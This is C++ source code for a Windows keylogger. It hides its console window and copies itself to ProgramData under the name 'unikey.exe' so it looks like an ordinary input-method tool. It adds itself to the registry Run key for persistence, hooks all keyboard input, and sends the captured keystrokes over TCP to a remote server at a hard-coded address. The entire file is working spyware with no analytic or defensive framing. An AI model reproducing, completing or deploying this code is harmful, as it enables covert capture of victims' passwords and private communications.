#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>   
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Ws2_32.lib") 

using namespace std;
bool checkCapslock = false;
bool checkShift = false;
int dem = 0;
string resultsSendServer = "";
SOCKET clientSocket;
void sendData() {
    send(clientSocket, resultsSendServer.c_str(), size(resultsSendServer), 0);
}
void checkKey(const char* nameKey) {
    if (strcmp(nameKey, "Space") == 0) {
        resultsSendServer +=  " ";
    }
    else if (strcmp(nameKey, "Caps Lock") == 0) {
        if (checkCapslock == true) {
            checkCapslock = false;
        }
        else checkCapslock = true;
    }
    else if (strcmp(nameKey, "Shift") == 0 || strcmp(nameKey, "Right Shift") == 0) {
        checkShift = true;
    }
    else if (strcmp(nameKey, "Tab") == 0) {
        resultsSendServer += "    ";
    }
    else if (strcmp(nameKey, "Enter") == 0){
        resultsSendServer += "\n";
    }
    else if (strcmp(nameKey, "Backspace") == 0) {
        resultsSendServer += "|b|";
    }
    else {
        if (size(string(nameKey)) == 1) {
            char key = nameKey[0];
            if (checkCapslock == true) {
                if (checkShift == true) {
                    if (isalpha(key) == true) {
                        cout << (char)tolower(key);
                    }
                    else {
                        switch (key)
                        {
                        case '1':
                            resultsSendServer += '!';
                            break;
                        case '2':
                            resultsSendServer += '@';
                            break;
                        case '3':
                            resultsSendServer += '#';
                            break;
                        case '4':
                            resultsSendServer += '$';
                            break;
                        case '5':
                            resultsSendServer += '%';
                            break;
                        case '6':
                            resultsSendServer += '^';
                            break;
                        case '7':
                            resultsSendServer += '&';
                            break;
                        case '8':
                            resultsSendServer += '*';
                            break;
                        case '9':
                            resultsSendServer += '(';
                            break;
                        case '0':
                            resultsSendServer += ')';
                            break;
                        case '-':
                            resultsSendServer += '_';
                            break;
                        case '=':
                            resultsSendServer += '+';
                            break;
                        case '`':
                            resultsSendServer += '~';
                            break;
                        case '[':
                            resultsSendServer += '{';
                            break;
                        case ']':
                            resultsSendServer += '}';
                            break;
                        case '\\':
                            resultsSendServer += '|';
                            break;
                        case ';':
                            resultsSendServer += ':';
                            break;
                        case '\'':
                            resultsSendServer += '"';
                            break;
                        case ',':
                            resultsSendServer += '<';
                            break;
                        case '.':
                            resultsSendServer += '>';
                            break;
                        case '/':
                            resultsSendServer += '?';
                            break;
                        default:
                            break;
                        }
                    }
                }
                else {
                    resultsSendServer += (char)toupper(key);
                }
            }
            else {
                if (checkShift == true) {
                    if (isalpha(key) == true) {
                        resultsSendServer += (char)toupper(key);
                    }
                    else {
                        switch (key)
                        {
                        case '1':
                            resultsSendServer += '!';
                            break;
                        case '2':
                            resultsSendServer += '@';
                            break;
                        case '3':
                            resultsSendServer += '#';
                            break;
                        case '4':
                            resultsSendServer += '$';
                            break;
                        case '5':
                            resultsSendServer += '%';
                            break;
                        case '6':
                            resultsSendServer += '^';
                            break;
                        case '7':
                            resultsSendServer += '&';
                            break;
                        case '8':
                            resultsSendServer += '*';
                            break;
                        case '9':
                            resultsSendServer += '(';
                            break;
                        case '0':
                            resultsSendServer += ')';
                            break;
                        case '-':
                            resultsSendServer += '_';
                            break;
                        case '=':
                            resultsSendServer += '+';
                            break;
                        case '`':
                            resultsSendServer += '~';
                            break;
                        case '[':
                            resultsSendServer += '{';
                            break;
                        case ']':
                            resultsSendServer += '}';
                            break;
                        case '\\':
                            resultsSendServer += '|';
                            break;
                        case ';':
                            resultsSendServer += ':';
                            break;
                        case '\'':
                            resultsSendServer += '"';
                            break;
                        case ',':
                            resultsSendServer += '<';
                            break;
                        case '.':
                            resultsSendServer += '>';
                            break;
                        case '/':
                            resultsSendServer += '?';
                            break;
                        default:
                            break;
                        }
                    }
                }
                else {
                    resultsSendServer += (char)tolower(key);
                }
            }
        }
        else {
        resultsSendServer += string(nameKey);
        }
    }
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    dem++;
    if (dem == 100) {
        dem = 0;
        sendData();
        resultsSendServer = "";
    }
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        checkCapslock = true;
    }
    else {
        checkCapslock = false;
    }
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
        LONG lParamKeyName = scanCode << 16;

        char nameKey[100] = { 0 };
        int resultsGetNameKey = GetKeyNameTextA(lParamKeyName, nameKey, sizeof(nameKey));

        if (resultsGetNameKey > 0) {
            checkKey(nameKey);
        }
    }
    else if (nCode == HC_ACTION && wParam == WM_KEYUP) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
        LONG lParamKeyName = scanCode << 16;

        char nameKey[100] = { 0 };
        int resultsGetNameKey = GetKeyNameTextA(lParamKeyName, nameKey, sizeof(nameKey));
        if (resultsGetNameKey > 0 &&  (strcmp(nameKey, "Shift") == 0 || strcmp(nameKey, "Right Shift") == 0)){
            checkShift = false;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}   

int main(int argc, char* argv[]) {
    //hidden windows
    ShowWindow(GetConsoleWindow(), 0);
    //end hidden windows
    // rename
    if (argc == 4 && strcmp(argv[1], "--rename") == 0) {
        const char* nameOld = argv[2];
        const char* nameNew = argv[3];
        Sleep(1000);

        BOOL copied = CopyFileA(nameOld, nameNew, FALSE);
        if (!copied) {
            DWORD err = GetLastError();
            printf("Copy failed! Error code: %lu\n", err);
        }
        else {
            DeleteFileA(nameOld); 
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            BOOL created = CreateProcessA(nameNew, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

            if (!created) {
                printf("Failed to launch new process. Error code: %lu\n", GetLastError());
            }
            else {
                printf("Launched new executable.\n");
            }
        }
        ExitProcess(0);
    }
    else {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        if (strcmp(path, "C:\\ProgramData\\unikey.exe") == 0){
            HKEY hkey = NULL;
            string pathString = string(path);
            RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
            RegSetValueExA(hkey, "UniKey", 0, REG_SZ, (BYTE*)(pathString.c_str()), (sizeof(pathString) + 1) * 2);
            //end startup
            WSADATA wsa;
            int error = WSAStartup(MAKEWORD(2, 2), &wsa);
            if (error != 0) {
                cout << "Wsa error" << endl;
            }
            clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (clientSocket == INVALID_SOCKET) {
                cout << "socket error" << endl;
            }
            sockaddr_in serverAddress;
            serverAddress.sin_family = AF_INET;
            serverAddress.sin_port = htons(12345);
            InetPton(AF_INET, L"10.2.44.20", &serverAddress.sin_addr);
            int resultConnect = connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress));
            if (resultConnect != 0) {
                cout << "connect false";
            }
            HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            UnhookWindowsHookEx(hook);
        }
        else {
            string newPath = "C:\\ProgramData\\unikey.exe";
            char commandLine[2 * MAX_PATH];
            sprintf(commandLine, "\"%s\" --rename \"%s\" \"%s\"", path, path, newPath.c_str());
            STARTUPINFO si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOA)(&si), &pi);
        }
    }
    // end rename
    //startup
    return 0;
}
